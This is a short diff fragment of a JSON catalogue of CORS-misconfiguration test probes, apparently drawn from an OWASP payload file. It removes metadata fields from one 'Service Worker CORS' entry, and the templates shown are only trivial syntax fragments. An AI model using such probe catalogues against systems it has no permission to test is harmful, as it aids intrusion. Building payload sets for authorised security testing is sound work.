+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: })"
   },
   {
     "id": "cors-misconfiguration-owasp-0142",
     "name": "Service Worker CORS #6",
     "template": ");",
-    "description": "Service Worker CORS probe from OWASP. Tests application handling of: );",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "cors-misconfiguration-payloads.txt"
+    "description": "Service Worker CORS probe from OWASP. Tests application handling of: );"
   }
 ]
